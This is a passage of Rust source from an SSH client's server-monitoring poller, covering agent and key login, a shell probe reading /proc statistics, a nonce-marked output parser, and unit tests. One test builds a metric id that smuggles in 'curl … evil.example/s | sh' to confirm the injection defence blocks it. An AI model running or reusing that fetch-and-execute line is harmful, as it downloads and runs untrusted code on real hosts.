        return Ok(Login::Password(password.clone()));
    }
    // A node saved without its password is asked for it at connect time
    // (issue #30), but monitoring has no UI to ask on.
    if use_agent {
        Ok(Login::Agent)
    } else if cfg!(desktop) {
        Err(NO_SAVED_LOGIN.into())
    } else {
        // A phone or tablet has no ssh-agent, nor the setting.
        Err(NO_SAVED_LOGIN_NO_AGENT.into())
    }
}

/// Whether a login to this node goes through the ssh-agent's keys.
fn login_uses_agent(auth: &NodeAuth, use_agent: bool) -> bool {
    matches!(classify_auth(auth, use_agent), Ok(Login::Agent))
}

const NO_SAVED_LOGIN: &str = "No password or key is saved for this node, and monitoring can't ask for one. Save a password or key, or turn on \"Use keys from an ssh-agent\" in Settings and load the key into the agent.";
const NO_SAVED_LOGIN_NO_AGENT: &str = "No password or key is saved for this node, and monitoring can't ask for one. Save a password or key to monitor it.";
const NO_AGENT_WITH_KEY: &str = "No password or key is saved for this node, and no ssh-agent with a key was found. Save a password or key, or load the key into an ssh-agent.";
const IDENTITIES_ONLY: &str = "No password or key is saved for this node, and ~/.ssh/config sets IdentitiesOnly yes for it, so the keys in an ssh-agent aren't used. Save a password or key to monitor it.";
const AGENT_LOOKUP_SLOW: &str = "No password or key is saved for this node, and looking for an ssh-agent took too long. Save a password or key, or check that the agent is running.";
/// Added to the message when the agent didn't sign (`MonitorEntry::agent_stopped`).
const AGENT_STOPPED: &str = "So that its prompts don't keep coming back, monitoring stops using the agent for this node until you pause and resume it.";

/// The most the look for an ssh-agent may take. Each place it looks bounds
/// its own wait (3 s to connect, 3 s to list keys); Windows looks in up to
/// three places.
const AGENT_LOOKUP_LIMIT: Duration = Duration::from_secs(20);
/// The least time the agent's part of a login gets, whatever the connect
/// timeout: the agent may show a prompt to approve the key's use.
const AGENT_LOGIN_MIN: Duration = Duration::from_secs(30);

/// The limit for the agent's part of a login.
fn agent_login_limit(connect_timeout: Duration) -> Duration {
    (connect_timeout * 2).max(AGENT_LOGIN_MIN)
}

/// The limit for a whole connect, login included. Reaching the address has
/// `connect_timeout` and the handshake twice that; the logins after it had
/// none, and get one more. A login with the agent's keys gets the agent's
/// limits on top, so their own errors, which name the agent, come first.
fn connect_limit(connect_timeout: Duration, via_agent: bool) -> Duration {
    let base = connect_timeout * 4;
    if via_agent {
        base + AGENT_LOOKUP_LIMIT + agent_login_limit(connect_timeout)
    } else {
        base
    }
}

/// Why a connect failed: the message for the node's status line, and whether
/// the ssh-agent was asked to sign and didn't (`MonitorEntry::agent_stopped`).
#[derive(Debug)]
struct ConnectError {
    message: String,
    agent_unsigned: bool,
}

impl From<String> for ConnectError {
    fn from(message: String) -> Self {
        Self { message, agent_unsigned: false }
    }
}

impl From<&str> for ConnectError {
    fn from(message: &str) -> Self {
        message.to_string().into()
    }
}

/// What `~/.ssh/config` says about the ssh-agent for a node, for a login with
/// the agent's keys (`Login::Agent`).
#[derive(Debug, Clone, Default)]
struct AgentConfig {
    /// `IdentityAgent`, when it applies: only that agent, or none.
    identity_agent: Option<crate::ssh_config::IdentityAgent>,
    /// `IdentitiesOnly yes`: only the key files the config names are used, so
    /// none of the agent's keys, as in a session (`agent_allowed` in lib.rs).
    identities_only: bool,
}

/// The ssh-agent for a node with no saved password or key, as `~/.ssh/config`
/// allows. `Err` says why there's none, for the node's status line.
async fn agent_for_monitor(config: &AgentConfig) -> Result<crate::agent_auth::AgentSession, String> {
    if config.identities_only {
        return Err(IDENTITIES_ONLY.into());
    }
    let mut why: Option<String> = None;
    let found = crate::agent_auth::find_agent_for(config.identity_agent.clone(), |m| why = Some(m)).await;
    match (found, why) {
        (Some(agent), _) => Ok(agent),
        // The config ruled the agent out, and says why.
        (None, Some(why)) => Err(format!("No password or key is saved for this node. {why} Save a password or key to monitor it.")),
        (None, None) => Err(NO_AGENT_WITH_KEY.into()),
    }
}

/// Log in with the keys `agent` holds, leaving out its security keys
/// (`Offer::Unattended`). An agent that asks to approve each use of a key asks
/// once per connection, not per reading. `limit` bounds the whole offer, so an
/// agent that never answers (waiting on an approval nobody gives) can't hold
/// the poller; the error then names the agent, not the server. When the agent
/// was asked to sign and didn't, the error says so (`agent_unsigned`), and the
/// poller stops asking it.
async fn log_in_with_agent<H: client::Handler>(
    session: &mut client::Handle<H>,
    user: &str,
    agent: &mut crate::agent_auth::AgentSession,
    limit: Duration,
) -> Result<(), ConnectError> {
    use crate::agent_auth::{capitalized, offer_keys, AgentOutcome, Offer};
    let source = agent.source;
    let offered = tokio::time::timeout(limit, offer_keys(session, user, agent, Offer::Unattended, |_| {})).await;
    let unsigned = |message: String| ConnectError { message: format!("{message} {AGENT_STOPPED}"), agent_unsigned: true };
    match offered {
        Ok(Ok(AgentOutcome::Authenticated)) => Ok(()),
        Ok(Ok(AgentOutcome::PartialSuccess { .. })) => Err(format!(
            "The server accepted a key from {source} but asks for more, such as a password or a code, which monitoring can't give."
        )
        .into()),
        Ok(Ok(AgentOutcome::NotAccepted)) => Err(match agent.untried_keys() {
            0 => format!("The server didn't accept the keys from {source}. Save a password or key for this node to monitor it."),
            // The attempt budget kept some back (offer_keys logs the same).
            n => format!(
                "The server didn't accept the keys tried from {source}, which holds {n} more key{} that {} not tried: the server limits failed attempts. Save the key for this node to monitor it.",
                if n == 1 { "" } else { "s" },
                if n == 1 { "was" } else { "were" },
            ),
        }
        .into()),
        // Every key is a security key (the agent lists at least one key).
        Ok(Ok(AgentOutcome::NothingToOffer)) => Err(format!(
            "{} holds only security keys, which monitoring leaves out: they wait for a touch or a PIN. Save a password or key for this node to monitor it.",
            capitalized(source)
        )
        .into()),
        Ok(Err(russh::Error::Keys(e))) => Err(unsigned(format!(
            "{} would not sign with the key the server accepted ({e}).",
            capitalized(source)
        ))),
        Ok(Err(e)) => Err(format!("Logging in with keys from {source} failed: {e}").into()),
        Err(_) => Err(unsigned(format!(
            "Logging in with keys from {source} took too long: the agent may be waiting for an approval, a PIN or a touch."
        ))),
    }
}

/// russh client config for monitor connections. The algorithm lists and the
/// DH group-exchange bounds come from the SAME functions as the interactive
/// session's (`crate::build_ssh_client_config`), so the monitor negotiates the
/// same host-key type whose fingerprint that session stored and approved.
/// russh's default list would not: it prefers ECDSA P-384 / P-521 host keys
/// over RSA (a fingerprint nobody approved → the monitor refuses the host)
/// and drops the legacy algorithms older servers need.
fn monitor_client_config() -> client::Config {
    let mut config = client::Config::default();
    // No russh protocol keepalive, as for the interactive session
    // (`crate::build_ssh_client_config`): before login completes it sends
    // nothing and spun a CPU core while a slow server took its time over the
    // login. Idle traffic is covered without it: the polls themselves, and OS
    // TCP keepalive on the socket (open_transport) for long poll intervals.
    config.keepalive_interval = None;
    // No keepalive-count disconnect (russh's default of 3 drops a quiet
    // connection after ~2 min of server silence): each poll has its own
    // timeout, and a failed poll drops the handle and reconnects.
    config.keepalive_max = 0;
    config.preferred = crate::ssh_preferred_algorithms();
    config.gex = crate::ssh_gex_params();
    config
}

/// The node as `~/.ssh/config` resolves it: an alias's HostName and Port, and
/// its User when none is saved, plus what it says about the ssh-agent
/// (IdentityAgent, IdentitiesOnly) for a node with no saved password or key.
/// The monitor takes nothing else from the config (no ProxyCommand /
/// ProxyJump or key files): in the background it never runs commands or asks
/// for anything. A node the config sends through a ProxyCommand or ProxyJump
/// (and that has no proxy of its own) isn't checked at all: `Err` says why.
async fn with_ssh_config(auth: &NodeAuth, node_name: &str) -> Result<(NodeAuth, AgentConfig), String> {
    let mut t = crate::ConfigTarget::resolve(&auth.host, auth.port, &auth.username, Some(node_name.to_string())).await;
    let own_route = match auth.proxy_type.as_str() {
        "socks5" => Some("SOCKS5 proxy"),
        "http" => Some("HTTP proxy"),
        _ => None,
    };
    match t.proxy(own_route) {
        Some(crate::ssh_config::Proxy::Command(_)) => Err(NOT_CHECKED_PROXY_COMMAND.into()),
        Some(crate::ssh_config::Proxy::Jump(_)) => Err(NOT_CHECKED_PROXY_JUMP.into()),
        _ => {
            let agent = AgentConfig {
                identity_agent: t.identity_agent(),
                identities_only: t.config.as_ref().is_some_and(|c| c.identities_only == Some(true)),
            };
            Ok((NodeAuth { host: t.host, port: t.port, username: t.user, ..auth.clone() }, agent))
        }
    }
}

const NOT_CHECKED_PROXY_COMMAND: &str =
    "Not checked: ~/.ssh/config reaches this server through a ProxyCommand, which status checks don't run.";
const NOT_CHECKED_PROXY_JUMP: &str =
    "Not checked: ~/.ssh/config reaches this server through a ProxyJump, which status checks don't use.";

/// Connect and log in. `use_agent` is the device's "Use keys from an
/// ssh-agent" setting; `agent_config` what `~/.ssh/config` says about the
/// agent for this node.
async fn connect_for_monitor(
    db: &Arc<std::sync::Mutex<Option<rusqlite::Connection>>>,
    auth: &NodeAuth,
    agent_config: &AgentConfig,
    connect_timeout: Duration,
    use_agent: bool,
) -> Result<russh::client::Handle<MonitorHandler>, ConnectError> {
    if auth.username.trim().is_empty() {
        // A node saved without a username is asked "Login as" when a terminal
        // connects (issue #54); monitoring can't ask, and falling back to root
        // would send this node's password to the wrong account.
        return Err(
            "No username is saved for this node — monitoring can't ask for one; save the username to monitor it".into(),
        );
    }
    let login = classify_auth(auth, use_agent)?;
    // Looked for before the server is contacted: without an agent that holds
    // a key there's nothing to log in with.
    let mut agent = match login {
        Login::Agent => match tokio::time::timeout(AGENT_LOOKUP_LIMIT, agent_for_monitor(agent_config)).await {
            Ok(found) => Some(found?),
            Err(_) => return Err(AGENT_LOOKUP_SLOW.into()),
        },
        _ => None,
    };

    // Asks the host for the kinds of host key on file for it first, as the
    // session does, so both negotiate the key that's trusted.
    let mut config = monitor_client_config();
    if let Ok(guard) = db.lock() {
        if let Some(conn) = guard.as_ref() {
            let families = crate::ssh_manager::known_host_families(conn, &auth.host, auth.port);
            crate::prefer_known_host_keys(&mut config.preferred, &families);
        }
    }
    let config = Arc::new(config);

    let handler = MonitorHandler {
        db: Arc::clone(db),
        host: auth.host.clone(),
        port: auth.port,
    };

    let transport = open_transport(auth, connect_timeout).await?;
    // Handshake budget mirrors the interactive path. We don't expose it
    // separately in settings; it's bounded by `connect_timeout` * 2 so very
    // chatty hosts (algorithm negotiation through a slow proxy) still get
    // a fair shake without hanging the UI.
    let handshake_budget = connect_timeout * 2;
    let mut session = tokio::time::timeout(
        handshake_budget,
        client::connect_stream(config, StreamBox(transport), handler),
    )
    .await
    .map_err(|_| format!("SSH handshake to {}:{} timed out", auth.host, auth.port))?
    .map_err(|e| format!("SSH connect: {}", e))?;

    // Auth order: the saved key first (more secure), the saved password only
    // when no key is saved (`classify_auth`). We DO NOT silently fall back
    // from a rejected key to password — that would risk leaking the password
    // to a server the user explicitly chose key auth for. With neither saved,
    // the keys an ssh-agent holds.
    let mut last_err: Option<String> = None;
    let mut accepted = false;

    // A security key's file holds only a handle, and signing with it would end
    // the session: only an ssh-agent can sign for it, and monitoring offers no
    // security key, not even an agent's (nobody is there to touch it). Looked
    // for before decoding too, so a missing passphrase isn't blamed.
    let security_key = || {
        format!(
            "the SSH key for {}@{} is a security key, which monitoring can't use: only an ssh-agent can sign with it",
            auth.username, auth.host,
        )
    };
    match &login {
        Login::Key { pem, .. } if crate::agent_auth::security_key_file(pem).is_some() => {
            last_err = Some(security_key());
        }
        Login::Key { pem, passphrase } => match crate::decode_private_key_blocking(pem, passphrase.as_deref()).await {
            Ok(kp) if crate::agent_auth::is_security_key(&kp.algorithm()) => last_err = Some(security_key()),
            Ok(kp) => {
                match crate::ssh_manager::authenticate_with_key(&mut session, &auth.username, kp)
                    .await
                {
                    Ok(true) => accepted = true,
                    Ok(false) => last_err = Some(format!(
                        "publickey auth rejected by {}@{}",
                        auth.username, auth.host,
                    )),
                    Err(e) => last_err = Some(format!("publickey: {}", e)),
                }
            }
            // Monitoring has no UI to prompt on (issue #30), so a key that needs
            // a passphrase we don't have is a clear, actionable error — not a
            // hang. The user saves the passphrase on the key to monitor it.
            Err(crate::KeyDecodeError::NeedsPassphrase) => {
                let saved = passphrase.as_deref().is_some_and(|p| !p.is_empty());
                last_err = Some(if saved {
                    format!(
                        "the saved passphrase doesn't unlock the SSH key for {}@{}",
                        auth.username, auth.host,
                    )
                } else {
                    format!(
                        "the SSH key for {}@{} is passphrase-protected but no passphrase is saved; monitoring can't ask for one — save it under Settings › SSH keys",
                        auth.username, auth.host,
                    )
                });
            }
            Err(crate::KeyDecodeError::Malformed(m)) => {
                last_err = Some(format!("could not decode private key: {}", m));
            }
        },
        // Only when no key is saved. A saved key that was rejected is
        // reported instead — see the comment above.
        Login::Password(p) => {
            match crate::ssh_manager::authenticate_with_password(&mut session, &auth.username, p).await {
                Ok(true) => accepted = true,
                Ok(false) => last_err = Some(format!(
                    "password auth rejected by {}@{}",
                    auth.username, auth.host,
                )),
                Err(e) => last_err = Some(format!("password: {}", e)),
            }
        }
        Login::Agent => {
            // Looked up above, before the server was contacted.
            let Some(agent) = agent.as_mut() else {
                return Err(NO_AGENT_WITH_KEY.into());
            };
            // Its own limit ends before the connect's (`connect_limit`), so
            // the error names the agent.
            log_in_with_agent(&mut session, &auth.username, agent, agent_login_limit(connect_timeout)).await?;
            accepted = true;
        }
    }

    if !accepted {
        return Err(last_err.unwrap_or_else(|| "auth failed".to_string()).into());
    }
    Ok(session)
}

// ---------------------------------------------------------------------------
// Polling: one composite script per cycle
// ---------------------------------------------------------------------------

/// Header lines for the built-in probe. Designed to run on the broadest
/// possible set of Linux distros — Debian/Ubuntu, RHEL/Fedora, Alpine
/// (busybox sh + busybox awk), embedded boxes with kernels predating
/// MemAvailable (~3.14), and minimal containers with only `/proc` mounted.
///
/// Tag-prefixed lines (`CPU …`, `MEM …` etc.) survive any MOTD or
/// shell-init noise the parser would otherwise have to filter. Each
/// command is wrapped to swallow stderr so a missing tool surfaces as a
/// missing tag in the parser (cleanly degraded) rather than a torrent of
/// "command not found" lines.
///
/// Only POSIX shell features + plain `awk` are used — no bash-isms, no
/// gawk extensions (`gensub`, length-of-array, etc.). Confirmed against
/// busybox 1.36 awk.
const BUILTIN_PROBE: &str = r#"
echo CPU $(awk '/^cpu /{print $2,$3,$4,$5,$6,$7,$8,$9}' /proc/stat 2>/dev/null)
echo MEM $(awk '
  /^MemTotal:/   {t=$2}
  /^MemAvailable:/ {a=$2; ok=1}
  /^MemFree:/    {f=$2}
  /^Buffers:/    {b=$2}
  /^Cached:/     {c=$2}
  END {
    # Kernels >= 3.14 have MemAvailable — use it directly. Older kernels
    # only have MemFree, so approximate "available" as Free + Buffers +
    # reclaimable Cached. Slightly optimistic but the best we can do.
    if (ok) print t, a; else print t+0, (f+b+c)+0
  }
' /proc/meminfo 2>/dev/null)
echo SWAP $(awk '
  /^SwapTotal:/{t=$2} /^SwapFree:/{f=$2}
  END {print t+0, f+0}
' /proc/meminfo 2>/dev/null)
echo LOAD $(awk '{print $1; exit}' /proc/loadavg 2>/dev/null)
# Disk usage on root: -k forces 1024-byte blocks so total/used are in KiB,
# which the parser already expects. -P keeps the figures on the device's
# line: without it BusyBox's df puts a device name longer than 20 characters
# (Alpine's /dev/mapper/vg0-lv_root) on a line of its own. A df without -P
# gets the plain form; the columns ($2 total, $3 used) are the same.
D=$(df -Pk / 2>/dev/null) || D=$(df -k / 2>/dev/null)
echo DISK $(printf '%s\n' "$D" | awk 'NR==2 {print $2, $3; exit}')
# Network totals across all real interfaces (skip loopback). Tolerates
# both `eth0:` and `  eth0:` formatting variants found in /proc/net/dev.
echo NET $(awk '
  BEGIN{r=0; t=0}
  NR>2 {
    line=$0
    sub(/^[ \t]+/, "", line)
    if (line ~ /^lo:/) next
    gsub(":", " ", line)
    n=split(line, f, /[ \t]+/)
    if (n >= 10) { r += f[2]; t += f[10] }
  }
  END {print r+0, t+0}
' /proc/net/dev 2>/dev/null)
"#;

const CUSTOM_BEGIN: &str = "__SUB_C_BEGIN__";
const CUSTOM_END: &str = "__SUB_C_END__";

/// Random per-poll token for the custom-metric markers, so output from the
/// monitored host can't fake a marker it hasn't seen.
fn probe_nonce() -> String {
    use rand::Rng;
    let mut bytes = [0u8; 8];
    rand::rng().fill_bytes(&mut bytes);
    hex::encode(bytes)
}

/// Sentinel pair around each custom command's stdout so the parser can
/// recover the per-metric slice. The markers carry the metric's INDEX and a
/// per-poll nonce, never its id: the id comes from the stored (possibly
/// synced) config, and splicing it into the script let a crafted id — one
/// the UI never shows — inject extra shell commands. Each marker is printed
/// on a line of its own, so a command whose output has no trailing newline
/// (`printf 42`) still closes its block.
fn build_probe_script(customs: &[CustomMetric], nonce: &str) -> String {
    let mut s = String::from(BUILTIN_PROBE);
    for (idx, cm) in customs.iter().enumerate() {
        // The probe is sh's (remote_sh), but a custom command is the user's
        // own, written for the shell they type in: it runs in the account's
        // login shell ($SHELL), as it did when that shell read the whole
        // probe. It goes there as one quoted word, in a process of its own,
        // so a `cd` or `set -e` inside one user command can't bleed into the
        // next, and one that doesn't parse (an unclosed quote) fails alone:
        // sh reads the whole probe before it runs any of it, and the
        // built-in readings and the other metrics still come. A `# comment`
        // at its end ends with the word.
        s.push_str(&format!(
            "\nprintf '\\n%s\\n' '{begin}{nonce}_{idx}'\n\"${{SHELL:-/bin/sh}}\" -c {cmd} 2>/dev/null\nprintf '\\n%s\\n' '{end}{nonce}_{idx}'\n",
            begin = CUSTOM_BEGIN,
            end = CUSTOM_END,
            cmd = crate::docker::shq(&cm.command.replace('\r', "")),
        ));
    }
    s
}

#[derive(Debug, Clone, Default)]
struct RawSnapshot {
    ts: u64,
    /// Sum of all CPU jiffies, and the idle portion (idle + iowait). We
    /// compute usage as `(busy_now-busy_prev) / (total_now-total_prev)`.
    cpu_total: u64,
    cpu_idle: u64,
    mem_total_kb: u64,
    mem_avail_kb: u64,
    swap_total_kb: u64,
    swap_free_kb: u64,
    load1: f64,
    disk_total_kb: u64,
    disk_used_kb: u64,
    net_rx_bytes: u64,
    net_tx_bytes: u64,
    /// Per-custom-metric raw stdout slice (trimmed). Indexed by custom id.
    custom_text: HashMap<String, String>,
    /// The custom metric whose output was cut off at the per-poll cap, if
    /// any — reported as too large instead of "no output".
    truncated_custom: Option<String>,
}

async fn poll_once(
    handle: &russh::client::Handle<MonitorHandler>,
    customs: &[CustomMetric],
    poll_timeout: Duration,
) -> Result<RawSnapshot, String> {
    let nonce = probe_nonce();
    let script = build_probe_script(customs, &nonce);
    let channel = handle
        .channel_open_session()
        .await
        .map_err(|e| format!("open session: {}", e))?;
    // sh reads the probe whatever the login shell is (csh has no `2>`).
    // Sending it and reading what it prints share the time limit.
    let deadline = tokio::time::Instant::now() + poll_timeout;
    crate::remote_sh::run_script(&channel, &script, deadline)
        .await
        .map_err(|e| format!("exec: {}", e))?;
    let mut stream = channel.into_stream();
    let mut buf = Vec::with_capacity(4096);
    // The probe prints a few hundred bytes plus each custom metric's output.
    // Cap what one poll may return: a hostile or broken host that streams
    // without end would otherwise grow this buffer until the allocation fails
    // and the whole process (every session and tunnel) aborts. Hitting the
    // cap isn't a failed poll: stop reading, close the channel, and parse
    // what arrived — the built-in readings come first, and only the metric
    // that overflowed (plus any after it) misses this poll.
    const MAX_PROBE_OUTPUT: usize = 256 * 1024;
    let mut truncated = false;
    let read_fut = async {
        let mut tmp = [0u8; 2048];
        loop {
            match stream.read(&mut tmp).await {
                Ok(0) => break,
                Ok(n) => {
                    let room = MAX_PROBE_OUTPUT - buf.len();
                    if n > room {
                        buf.extend_from_slice(&tmp[..room]);
                        truncated = true;
                        break;
                    }
                    buf.extend_from_slice(&tmp[..n]);
                }
                Err(_) => break,
            }
        }
    };
    tokio::time::timeout_at(deadline, read_fut)
        .await
        .map_err(|_| "probe script timed out".to_string())?;
    drop(stream);

    parse_probe(&String::from_utf8_lossy(&buf), &nonce, customs, truncated)
}

fn parse_probe(
    text: &str,
    nonce: &str,
    customs: &[CustomMetric],
    truncated: bool,
) -> Result<RawSnapshot, String> {
    let mut snap = RawSnapshot::default();
    snap.ts = now_ms();
    // Two-pass: first carve out the custom blocks (anything between
    // BEGIN<nonce>_<idx> and END<nonce>_<idx> belongs to custom metric
    // `idx`, not to the built-in tag stream). Custom output can contain
    // multi-line text or even our own tag names without confusing the
    // built-in parser.
    //
    // Custom output comes from the monitored host, so it must not be able to
    // pass for a built-in reading (e.g. close its block early, then print
    // `DISK 100 1` to hide a full disk). The built-in probe runs first, so
    // its lines all precede the first custom block: after that block opens,
    // anything outside a block is dropped. Blocks are only recognised with
    // this poll's nonce, in script order, once each.
    let begin = format!("{}{}_", CUSTOM_BEGIN, nonce);
    let end = format!("{}{}_", CUSTOM_END, nonce);
    let mut builtin_lines: Vec<&str> = Vec::new();
    let mut seen_custom = false;
    let mut next_idx: usize = 0;
    let mut open: Option<usize> = None;
    let mut current_buf = String::new();
    for line in text.lines() {
        let t = line.trim();
        if open.is_none() {
            if let Some(rest) = t.strip_prefix(begin.as_str()) {
                if next_idx < customs.len() && rest.parse::<usize>().ok() == Some(next_idx) {
                    open = Some(next_idx);
                    seen_custom = true;
                    current_buf.clear();
                    continue;
                }
            }
        } else if let Some(rest) = t.strip_prefix(end.as_str()) {
            if let Some(idx) = open.filter(|&i| rest.parse::<usize>().ok() == Some(i)) {
                snap.custom_text.insert(customs[idx].id.clone(), current_buf.trim().to_string());
                open = None;
                next_idx += 1;
                current_buf.clear();
                continue;
            }
        }
        if open.is_some() {
            if !current_buf.is_empty() {
                current_buf.push('\n');
            }
            current_buf.push_str(line); // keep original (with leading whitespace)
        } else if !seen_custom {
            builtin_lines.push(t);
        }
    }
    // If a BEGIN had no matching END (custom command crashed), drop the
    // partial buffer — better than reporting half a value. When the output
    // was cut at the cap, the block still open is the one that overflowed.
    if truncated {
        snap.truncated_custom = open.map(|idx| customs[idx].id.clone());
    }
    for line in builtin_lines {
        if line.is_empty() {
            continue;
        }
        let mut it = line.split_whitespace();
        let tag = match it.next() {
            Some(t) => t,
            None => continue,
        };
        let rest: Vec<&str> = it.collect();
        match tag {
            "CPU" if rest.len() >= 4 => {
                // user nice system idle iowait irq softirq steal
                // Saturating arithmetic: the values come straight off the
                // monitored host's /proc/stat, so a malicious/compromised
                // server could send u64::MAX-scale tokens whose sum overflows
                // and panics this poller task in a debug build (overflow-checks
                // on). Saturate instead of trusting the remote input.
                let nums: Vec<u64> = rest.iter().map(|s| s.parse().unwrap_or(0)).collect();
                let total: u64 = nums.iter().fold(0u64, |acc, &n| acc.saturating_add(n));
                let idle = nums.get(3).copied().unwrap_or(0)
                    .saturating_add(nums.get(4).copied().unwrap_or(0));
                snap.cpu_total = total;
                snap.cpu_idle = idle;
            }
            "MEM" if rest.len() >= 2 => {
                snap.mem_total_kb = rest[0].parse().unwrap_or(0);
                snap.mem_avail_kb = rest[1].parse().unwrap_or(0);
            }
            "SWAP" if rest.len() >= 2 => {
                snap.swap_total_kb = rest[0].parse().unwrap_or(0);
                snap.swap_free_kb = rest[1].parse().unwrap_or(0);
            }
            "LOAD" if !rest.is_empty() => {
                // f64 parses `nan` and `inf` too; JSON can't carry them, the
                // page would get a null.
                snap.load1 = rest[0].parse().ok().filter(|v: &f64| v.is_finite()).unwrap_or(0.0);
            }
            "DISK" if rest.len() >= 2 => {
                snap.disk_total_kb = rest[0].parse().unwrap_or(0);
                snap.disk_used_kb = rest[1].parse().unwrap_or(0);
            }
            "NET" if rest.len() >= 2 => {
                snap.net_rx_bytes = rest[0].parse().unwrap_or(0);
                snap.net_tx_bytes = rest[1].parse().unwrap_or(0);
            }
            _ => { /* ignore unknown tags */ }
        }
    }
    Ok(snap)
}

fn compute_sample(
    node_id: i32,
    now: &RawSnapshot,
    prev: &Option<RawSnapshot>,
    enabled: &[String],
    customs: &[CustomMetric],
) -> Sample {
    let mut values: HashMap<String, f64> = HashMap::new();
    let mut errors: HashMap<String, String> = HashMap::new();
    let mut texts: HashMap<String, String> = HashMap::new();
    let want = |k: &str| enabled.iter().any(|s| s == k);

    // CPU% — diff-based; needs prev. First sample yields no value (so the
    // sparkline is correctly empty rather than fake-zero).
    if want("cpu") {
        if let Some(p) = prev {
            let dt = now.cpu_total.saturating_sub(p.cpu_total);
            let di = now.cpu_idle.saturating_sub(p.cpu_idle);
            if dt > 0 {
                let busy = dt.saturating_sub(di) as f64;
                values.insert("cpu".into(), (busy / dt as f64) * 100.0);
            }
        }
    }
    if want("mem") {
        if now.mem_total_kb > 0 {
            let used = now.mem_total_kb.saturating_sub(now.mem_avail_kb);
            values.insert(
                "mem".into(),
                (used as f64 / now.mem_total_kb as f64) * 100.0,
            );
        } else {
            errors.insert("mem".into(), "memtotal=0".into());
        }
    }
    if want("swap") {
        if now.swap_total_kb > 0 {
            let used = now.swap_total_kb.saturating_sub(now.swap_free_kb);
            values.insert(
                "swap".into(),
                (used as f64 / now.swap_total_kb as f64) * 100.0,
            );
        } else {
            // Hosts without swap report 0/0 — that's fine, surface as 0%.
            values.insert("swap".into(), 0.0);
        }
    }
    if want("disk") {
        if now.disk_total_kb > 0 {
            values.insert(
                "disk".into(),
                (now.disk_used_kb as f64 / now.disk_total_kb as f64) * 100.0,
            );
        }
    }
    if want("load") {
        values.insert("load".into(), now.load1);
    }
    if want("net") {
        if let Some(p) = prev {
            let dt_ms = now.ts.saturating_sub(p.ts);
            if dt_ms > 0 {
                let secs = dt_ms as f64 / 1000.0;
                let dr = now.net_rx_bytes.saturating_sub(p.net_rx_bytes) as f64 / secs;
                let dt = now.net_tx_bytes.saturating_sub(p.net_tx_bytes) as f64 / secs;
                values.insert("net_in".into(), dr);
                values.insert("net_out".into(), dt);
            }
        }
    }
    // Custom metrics: pull each one's captured stdout and apply its parse
    // mode. Numeric outputs land in `values` (so the UI ring buffer picks
    // them up for sparklines); text outputs land in `texts`.
    for cm in customs {
        let raw = match now.custom_text.get(&cm.id) {
            Some(s) => s.trim().to_string(),
            None => {
                let why = if now.truncated_custom.as_deref() == Some(cm.id.as_str()) {
                    "output larger than 256 KiB"
                } else {
                    "no output"
                };
                errors.insert(cm.id.clone(), why.into());
                continue;
            }
        };
        match cm.parse.as_str() {
            "number" => match extract_number(&raw) {
                Some(v) => { values.insert(cm.id.clone(), v); }
                None => { errors.insert(cm.id.clone(), "no numeric token in output".into()); }
            },
            "regex" => {
                let pattern = cm.regex.as_deref().unwrap_or("");
                match apply_regex_number(pattern, &raw) {
                    Ok(v) => { values.insert(cm.id.clone(), v); }
                    Err(e) => { errors.insert(cm.id.clone(), e); }
                }
            }
            // "text" or anything else → treat as text
            _ => {
                texts.insert(cm.id.clone(), raw);
            }
        }
    }

    Sample {
        node_id,
        ts: now.ts,
        values,
        errors,
        texts,
    }
}

/// Pull the first numeric token (possibly with sign and decimal) out of any
/// stdout. Tolerant: works for "42", "42.5", "load 1.2 1.0 0.9", "  3 ", etc.
fn extract_number(s: &str) -> Option<f64> {
    let mut chars = s.chars().peekable();
    let mut buf = String::new();
    let mut in_num = false;
    while let Some(&c) = chars.peek() {
        if !in_num {
            if c == '-' || c == '+' || c.is_ascii_digit() {
                in_num = true;
                buf.push(c);
                chars.next();
                continue;
            }
            chars.next();
        } else {
            if c.is_ascii_digit() || c == '.' {
                buf.push(c);
                chars.next();
            } else {
                break;
            }
        }
    }
    // A run of 400 digits parses as infinity.
    if buf.is_empty() { None } else { buf.parse::<f64>().ok().filter(|v| v.is_finite()) }
}

/// Apply a user-provided regex to the output and pull the first capture
/// group as a number. Empty pattern, compile failure, or non-numeric
/// capture all surface as a clear error for the UI.
fn apply_regex_number(pattern: &str, text: &str) -> Result<f64, String> {
    if pattern.trim().is_empty() {
        return Err("regex pattern is empty".into());
    }
    let re = regex::Regex::new(pattern).map_err(|e| format!("bad regex: {}", e))?;
    let caps = re.captures(text).ok_or("regex did not match")?;
    let m = caps.get(1).or_else(|| caps.get(0)).ok_or("no capture group")?;
    let v = m.as_str().trim().parse::<f64>()
        .map_err(|e| format!("captured value not numeric: {}", e))?;
    // `nan` and `inf` parse, but aren't a reading the page can show.
    if v.is_finite() { Ok(v) } else { Err("captured value not numeric".into()) }
}

fn now_ms() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

#[cfg(test)]
mod probe_tests {
    use super::{
        apply_regex_number, build_probe_script, compute_sample, extract_number, parse_probe, CustomMetric,
        CUSTOM_BEGIN, CUSTOM_END,
    };

    fn metric(id: &str, command: &str) -> CustomMetric {
        CustomMetric {
            id: id.into(),
            name: "m".into(),
            command: command.into(),
            parse: "text".into(),
            regex: None,
            display: "text".into(),
            unit: None,
        }
    }

    fn block(nonce: &str, idx: usize, body: &str) -> String {
        format!("{CUSTOM_BEGIN}{nonce}_{idx}\n{body}\n{CUSTOM_END}{nonce}_{idx}\n")
    }

    #[test]
    fn metric_id_never_reaches_the_script() {
        // A crafted id (newline + command) the UI never displays.
        let evil = metric("x\ncurl -fsS https://evil.example/s | sh\n#", "uptime");
        let script = build_probe_script(&[evil], "abc123");
        assert!(!script.contains("evil.example"), "id leaked into the probe script");
        // The visible command is still there, for the login shell to run.
        assert!(script.contains("\"${SHELL:-/bin/sh}\" -c 'uptime' 2>/dev/null"));
        assert!(script.contains("__SUB_C_BEGIN__abc123_0"));
    }

    #[test]
    fn custom_blocks_map_back_to_their_ids() {
        let customs = [metric("load1", "x"), metric("users", "y")];
        let text = format!(
            "DISK 1000 250\n{}{}",
            block("n0n", 0, "0.42"),
            block("n0n", 1, "3 users\nsecond line"),
        );
        let snap = parse_probe(&text, "n0n", &customs, false).unwrap();
        assert_eq!(snap.custom_text.get("load1").map(String::as_str), Some("0.42"));
        assert_eq!(snap.custom_text.get("users").map(String::as_str), Some("3 users\nsecond line"));
        assert_eq!((snap.disk_total_kb, snap.disk_used_kb), (1000, 250));
    }

    #[test]
